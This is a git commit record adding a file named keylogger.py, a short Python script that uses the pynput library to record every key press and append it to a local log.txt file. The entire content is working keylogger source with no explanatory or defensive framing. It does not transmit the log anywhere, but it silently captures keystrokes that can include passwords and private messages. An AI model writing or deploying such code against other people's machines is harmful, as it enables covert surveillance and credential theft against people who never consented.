4963f0dd9f8a137ace79f886a3330a79c38357a8
João Vyctor Ferreira <105954724+joaovyctorfc@users.noreply.github.com>
2023-07-10 16:24:10 -0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,10 @@
+from pynput.keyboard import Listener
+
+
+def log(teclado):
+    with open('log.txt', 'a') as arquivo_log:
+        arquivo_log.write(str(teclado))
+
+
+with Listener(on_press=log) as monitor:
+    monitor.join()
